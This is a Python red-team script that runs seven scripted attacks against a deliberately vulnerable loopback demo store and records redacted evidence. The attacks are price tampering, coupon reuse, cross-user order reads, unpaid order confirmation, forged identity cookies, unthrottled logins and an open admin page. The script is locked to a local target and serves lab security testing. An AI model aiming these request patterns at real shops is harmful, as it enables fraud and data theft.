"""Run one or all V1-V7 attacks against the loopback Naive Shop."""
import argparse
import json
import pathlib
import sys
import urllib.error
import urllib.request
from datetime import datetime, timezone
from urllib.parse import urlparse


BASE = "http://127.0.0.1:8010"
EVIDENCE_DIR = pathlib.Path(__file__).resolve().parents[1] / "evidence" / "naive_shop"
rows = []
exchanges = []


def request(method, path, body=None, cookie=None, identity_note=None):
    headers = {"Content-Type": "application/json"}
    if cookie:
        headers["Cookie"] = cookie
    data = json.dumps(body).encode("utf-8") if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, headers=headers, method=method)
    try:
        response = urllib.request.urlopen(req, timeout=10)
        status = response.getcode()
        response_body = response.read().decode("utf-8", "replace")
        response_headers = dict(response.headers)
    except urllib.error.HTTPError as error:
        status = error.code
        response_body = error.read().decode("utf-8", "replace")
        response_headers = dict(error.headers)

    safe_body = dict(body) if isinstance(body, dict) else body
    if isinstance(safe_body, dict):
        for key in ("password", "token", "secret"):
            if key in safe_body:
                safe_body[key] = "[REDACTED]"
    safe_headers = {"Host": urlparse(BASE).netloc, **headers}
    if "Cookie" in safe_headers:
        safe_headers["Cookie"] = (
            f"[REDACTED; test identity: {identity_note}]"
            if identity_note else "[REDACTED]"
        )
    exchanges.append({
        "method": method,
        "path": path,
        "request_headers": safe_headers,
        "request_body": json.dumps(safe_body, sort_keys=True) if safe_body is not None else None,
        "status": status,
        "response_headers": {
            key: "[REDACTED]" if key.lower() == "set-cookie" else value
            for key, value in response_headers.items()
        },
        "response_body": response_body,
    })
    return status, response_body, response_headers.get("Set-Cookie", "")


def reset():
    status, body, _ = request("GET", "/reset")
    result = json.loads(body)
    if status != 200 or result.get("ok") is not True:
        raise AssertionError(f"Local in-memory reset failed: HTTP {status}")


def login_alice():
    status, _, set_cookie = request(
        "POST", "/api/login", {"username": "alice", "password": "alice123"}
    )
    if status != 200 or not set_cookie:
        raise AssertionError(f"Disposable Alice login precondition failed: HTTP {status}")
    return set_cookie.split(";", 1)[0]


def record(test_id, scenario, result, impact):
    rows.append((test_id, scenario, result, impact))
    print(f"{test_id}: {result} - {impact}")


def test_v1():
    reset()
    alice = login_alice()
    status, body, _ = request(
        "POST", "/api/checkout", {"product_id": 1, "price": 1},
        cookie=alice, identity_note="Alice, disposable seeded account",
    )
    order_id = json.loads(body).get("order_id")
    read_status, read_body, _ = request(
        "GET", f"/api/orders/{order_id}", cookie=alice,
        identity_note="Alice, disposable seeded account",
    )
    order = json.loads(read_body)
    if status != 200 or read_status != 200 or order.get("total") != 1.0:
        raise AssertionError("Expected the $1337 catalog item's stored order total to be $1.00.")
    record("V1", "Client-controlled checkout price", "PASS", "Persisted order total was $1.00.")


def test_v2():
    reset()
    responses = []
    for _ in range(2):
        status, body, _ = request(
            "POST", "/api/apply_coupon", {"code": "SAVE20", "subtotal": 100}
        )
        responses.append((status, json.loads(body)))
    if any(status != 200 or result.get("new_subtotal") != 80.0 for status, result in responses):
        raise AssertionError("The same coupon was not accepted twice at the expected discount.")
    record("V2", "Coupon reuse", "PASS", "Repeated requests each returned a 20% discount.")


def test_v3():
    reset()
    alice = login_alice()
    _, created, _ = request(
        "POST", "/api/checkout", {"product_id": 1, "price": 1337},
        cookie=alice, identity_note="Alice, disposable seeded account",
    )
    order_id = json.loads(created).get("order_id")
    status, body, _ = request(
        "GET", f"/api/orders/{order_id}", cookie="user=bob",
        identity_note="Bob, disposable seeded account",
    )
    order = json.loads(body)
    if status != 200 or order.get("owner") != "alice":
        raise AssertionError("Bob did not retrieve Alice's order.")
    record("V3", "Cross-user order access", "PASS", f"Bob retrieved Alice's order #{order_id}.")


def test_v4():
    reset()
    alice = login_alice()
    _, created, _ = request(
        "POST", "/api/checkout", {"product_id": 1, "price": 1337},
        cookie=alice, identity_note="Alice, disposable seeded account",
    )
    order_id = json.loads(created).get("order_id")
    _, before_body, _ = request("GET", f"/api/orders/{order_id}")
    before = json.loads(before_body)
    status, body, _ = request("GET", f"/api/confirm?order={order_id}", cookie="user=bob",
                              identity_note="Bob, disposable seeded account")
    result = json.loads(body)
    check_status, check_body, _ = request("GET", f"/api/orders/{order_id}")
    after = json.loads(check_body)
    if (before.get("paid") is not False or status != 200
            or result.get("order", {}).get("paid") is not True
            or check_status != 200 or after.get("paid") is not True):
        raise AssertionError("Unpaid order was not transitioned to paid by confirmation.")
    record("V4", "Unpaid workflow confirmation", "PASS",
           f"Order #{order_id} changed from unpaid to paid without payment.")


def test_v5():
    reset()
    forged = "user=forged-demo-identity"
    status, body, _ = request(
        "POST", "/api/checkout", {"product_id": 1, "price": 1},
        cookie=forged, identity_note="forged disposable identity",
    )
    order_id = json.loads(body).get("order_id")
    read_status, read_body, _ = request("GET", f"/api/orders/{order_id}")
    order = json.loads(read_body)
    if status != 200 or read_status != 200 or order.get("owner") != "forged-demo-identity":
        raise AssertionError("Forged client identity was not persisted as the order owner.")
    record("V5", "Client-controlled identity cookie", "PASS",
           "Checkout accepted and persisted a forged cookie identity.")


def test_v6():
    reset()
    bad_statuses = [
        request("POST", "/api/login", {"username": "alice", "password": "wrong"})[0]
        for _ in range(8)
    ]
    valid_status, _, _ = request(
        "POST", "/api/login", {"username": "alice", "password": "alice123"}
    )
    if bad_statuses != [401] * 8 or valid_status != 200:
        raise AssertionError("Observed responses did not match eight failures followed by successful login.")
    record("V6", "Missing login throttling", "PASS",
           "Eight invalid attempts were followed by a successful valid login.")


def test_v7():
    reset()
    status, body, _ = request("GET", "/admin")
    lower_body = body.lower()
    if status != 200 or not all(value in lower_body for value in ("alice", "bob", "admin", "credit")):
        raise AssertionError("Unauthenticated admin response did not expose expected seeded data.")
    record("V7", "Unauthenticated admin access", "PASS",
           "Anonymous response exposed seeded users, roles, and simulated credit.")


TESTS = {
    "V1": test_v1,
    "V2": test_v2,
    "V3": test_v3,
    "V4": test_v4,
    "V5": test_v5,
    "V6": test_v6,
    "V7": test_v7,
}


def write_evidence(path, selection):
    lines = [
        f"# Naive Shop {selection} attack evidence",
        "",
        f"- Timestamp: {datetime.now(timezone.utc).isoformat()}",
        f"- Target: `{BASE}`; local-only server and disposable in-memory data.",
        "- Passwords, cookie values, and token/secret fields are redacted.",
        "- PASS means the expected vulnerable behavior and impact were observed, not merely an HTTP 200.",
        "- V2 proves repeated discount calculation acceptance, not completed discounted purchases.",
        "- V6 verifies eight invalid attempts followed by a successful correct login; it does not characterize other throttling layers.",
        "",
        "| ID | Scenario | Result | Observed impact |",
        "|---|---|---|---|",
    ]
    lines.extend(f"| {test_id} | {scenario} | {result} | {impact} |"
                 for test_id, scenario, result, impact in rows)
    lines.extend(["", "## Sanitized HTTP exchanges", ""])
    for index, exchange in enumerate(exchanges, 1):
        lines.extend([
            f"### Exchange {index}: {exchange['method']} {exchange['path']}",
            "",
            "```http",
            f"{exchange['method']} {exchange['path']} HTTP/1.1",
        ])
        lines.extend(f"{key}: {value}" for key, value in exchange["request_headers"].items())
        if exchange["request_body"] is not None:
            lines.extend(["", exchange["request_body"]])
        lines.extend(["```", "", "```http", f"HTTP/1.0 {exchange['status']}"])
        lines.extend(f"{key}: {value}" for key, value in exchange["response_headers"].items())
        lines.extend(["", exchange["response_body"], "```", ""])
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Run one independent Naive Shop attack or the complete V1-V7 suite."
    )
    parser.add_argument("--test", choices=["all", *TESTS], default="all",
                        help="attack to run; each selection starts with a fresh in-memory reset")
    parser.add_argument("--output", type=pathlib.Path,
                        help="new evidence file inside red_team/evidence/naive_shop/")
    args = parser.parse_args(argv)

    target = urlparse(BASE)
    if target.scheme != "http" or target.hostname != "127.0.0.1" or target.port != 8010:
        parser.error("refusing to test any target other than http://127.0.0.1:8010")

    selection = args.test
    stamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    output = args.output or EVIDENCE_DIR / f"naive_attack_{stamp}_{selection}.md"
    output = output.resolve()
    if output.parent != EVIDENCE_DIR.resolve():
        parser.error("evidence output must stay inside red_team/evidence/naive_shop/")
    if output.exists():
        parser.error(f"refusing to overwrite existing evidence: {output}")

    chosen = TESTS.items() if selection == "all" else [(selection, TESTS[selection])]
    failed = []
    print(f"Target: {BASE} (loopback only)")
    for test_id, test in chosen:
        try:
            test()
        except Exception as error:
            failed.append(test_id)
            rows.append((test_id, test.__doc__ or test_id, "FAIL", str(error)))
            print(f"{test_id}: FAIL - {error}", file=sys.stderr)

    output.parent.mkdir(parents=True, exist_ok=True)
    write_evidence(output, selection)
    print(f"Evidence: {output}")
    print(f"Summary: {len(rows) - len(failed)} PASS, {len(failed)} FAIL")
    return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(main())
